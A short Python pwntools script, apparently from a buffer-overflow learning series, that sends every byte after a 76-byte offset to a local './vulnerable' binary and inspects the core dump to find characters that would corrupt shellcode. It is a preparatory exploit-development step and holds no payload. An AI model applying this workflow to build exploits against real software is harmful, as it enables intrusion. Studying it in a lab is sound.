#!/usr/bin/env python3
"""
Bad Character Tester (Project #21)
Sends every byte 0x00-0xFF and checks which get mangled.
"""

from pwn import *
import os

context.log_level = 'error'

BINARY = "./vulnerable"

# Bytes that are often problematic:
#   \x00  NULL — terminates strings
#   \x0a  LF   — newline
#   \x0d  CR   — carriage return
#   \x20  space— argument separator in shells
KNOWN_BAD = [0x00, 0x0a, 0x0d, 0x20]

def find_bad_bytes(offset):
    """Send bytes 0x01-0xFF after the offset and observe corruption."""
    all_bytes = bytes([b for b in range(1, 256)])
    payload = b"A" * offset + all_bytes

    p = process([BINARY, payload])
    try:
        p.wait(timeout=2)
    except EOFError:
        pass

    try:
        core = p.corefile
        stack_dump = core.read(core.esp, 256)
        # Find where our bytes stopped matching
        good = []
        for i, b in enumerate(all_bytes):
            if i < len(stack_dump) and stack_dump[i] == b:
                good.append(b)
            else:
                print(f"[!] Bad byte: {hex(b)}")
        return good
    except Exception as e:
        print(f"[!] Could not read stack: {e}")
        print(f"[*] Known bad bytes (common): "
              f"{', '.join(hex(b) for b in KNOWN_BAD)}")
        return KNOWN_BAD

if __name__ == "__main__":
    OFFSET = 76  # from find_offset.py
    print("=" * 70)
    print("  BAD CHARACTER TESTER")
    print("=" * 70)
    find_bad_bytes(OFFSET)